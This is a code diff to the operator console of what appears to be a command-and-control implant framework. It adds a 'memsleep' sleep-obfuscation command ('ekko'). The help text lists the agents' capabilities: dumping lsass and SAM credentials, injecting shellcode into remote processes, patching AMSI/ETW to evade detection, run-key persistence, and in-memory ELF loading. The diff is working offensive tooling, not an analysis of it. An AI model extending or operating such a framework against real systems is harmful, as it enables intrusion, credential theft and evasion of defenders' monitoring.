@@ -87,6 +87,10 @@ agent_completer_windows = NestedCompleter.from_nested_dict({
         'amsi': None,
         'etw': None
     },
+    'memsleep': {
+        'none': None,
+        'ekko': None
+    },
     'persist': {
         'run': None,
         'spe': None
@@ -196,11 +200,12 @@ def print_agent_help(os):
     lsass <method>                         ->  dump lsass.exe [methods:  direct,comsvcs] (elevation required)
     sam                                    ->  dump sam,security,system hives using reg.exe (elevation required)
     shellc <raw-shellcode-file> <pid>      ->  inject shellcode to remote process
-    assembly <local-assembly> <args>       ->  execute .net assembly (pass all args as a single string using quotes)
+    assembly <local-assembly> <args>       ->  execute .net assembly (pass all args as a single quoted string)
                                                warning: make sure the assembly doesn't call any exit function
     
     --== Evasion Stuff ==--
-    patch <amsi|etw>                       ->  patch amsi/etw using indirect syscalls
+    patch <amsi/etw>                       ->  patch amsi/etw using indirect syscalls
+    memsleep <none/ekko>                   ->  sleep obfuscation technique
     
     --== Persistence Stuff ==--
     persist run <command> <key-name>       ->  set run key (will try first hklm, then hkcu)
@@ -240,7 +245,7 @@ def print_agent_help(os):
     memfd <mode> <elf-file> <commandline>  ->  load elf in-memory using the memfd_create syscall
                                                implant mode: load the elf as a child process and return
                                                task mode: load the elf as a child process, wait on it, and get its output when it's done
-                                               (pass the whole commandline as a single string using quotes)
+                                               (pass the whole command line as a single quoted string)
     
     --== Communication Stuff ==--
     sleep <sleep-time> <jitter-%>          ->  change sleep time interval and jitter
@@ -411,6 +416,13 @@ def agent_screen_windows(agent_id):
                 command_dict = {
                     "command_type": "patch",
                     "patch_func": patch_func
+                }
+            
+            elif re.fullmatch(r"\s*memsleep\s+(none|ekko)\s*", command):
+                memsleep_technique = shlex.split(re.sub(r"\s*memsleep\s+", "", command, 1))[0]
+                command_dict = {
+                    "command_type": "memsleep",
+                    "memsleep_technique": memsleep_technique
                 }
 
             elif re.fullmatch(r"\s*persist\s+(run|spe)\s+.*", command):
